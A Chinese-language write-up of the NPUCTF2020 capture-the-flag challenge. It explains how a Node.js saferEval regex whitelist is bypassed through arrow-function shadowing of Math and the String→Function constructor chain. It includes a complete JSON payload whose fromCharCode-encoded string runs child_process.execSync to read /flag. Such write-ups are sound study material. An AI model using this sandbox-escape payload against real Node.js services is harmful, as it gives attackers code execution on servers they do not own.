---
type: source
created: 2026-05-13
updated: 2026-05-13
related: []
---

# NPUCTF2020 验证🐎

Node.js saferEval 正则白名单绕过。箭头函数参数遮蔽 + 原型链攀爬 String→Function + fromCharCode 编码 RCE。

涉及概念：[[concepts/js-arrow-param-shadow-rce]]

## 环境

- Node.js + Express + cookie-session
- `bodyParser.json()` 启用（支持 JSON body）
- `Object.freeze(Object)` + `Object.freeze(Math)`
- saferEval 正则白名单：`Math.xxx`、运算符 `()+\-*/&|^%<>=,?:`、数字、空格

## 攻击路径

1. JSON 类型混淆绕过 MD5 验证码：`first="1"`, `second=[1]`
2. 箭头函数 `(Math=>...)(Math+1)` 创建局部字符串变量
3. `Math.constructor` → String → `String.constructor` → Function
4. `String.fromCharCode(...)` 编码任意代码字符串
5. `Function(code)()` 执行 RCE 读 flag

## Payload

```json
{
  "e": "(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)",
  "first": "1",
  "second": [1]
}
```

## 利用链详解

```
(Math+1) = "[object Math]1"  (字符串)
  → Math = Math.constructor = String
  → Math.constructor = String.constructor = Function
  → Math.fromCharCode(...) = String.fromCharCode(...) = "return process.mainModule.require(...)"
  → Function(code)() = RCE
```

## 关键细节

- 箭头函数参数 `Math` 遮蔽全局 Math，避免全局污染导致服务器崩溃
- `=>` 由 `=` 和 `>` 两个独立运算符组成，通过正则检查
- `Math.xxx` 中 `\w+` 匹配 `constructor`/`fromCharCode`/`x` 等任意单词
- Function() 创建的函数在全局作用域执行，需用 `process.mainModule.require` 而非直接 `require`
- 逗号运算符 `,` 在括号内串联多个表达式

## 教训

- 正则白名单如果允许 `=` 和 `>` 就等于允许箭头函数
- 箭头函数参数可以遮蔽全局变量，创建安全的局部操作空间
- `Math+1` 类型转换是获取字符串对象的经典入口
- 原型链 string→String→Function 是 JS 沙箱逃逸的通用路径
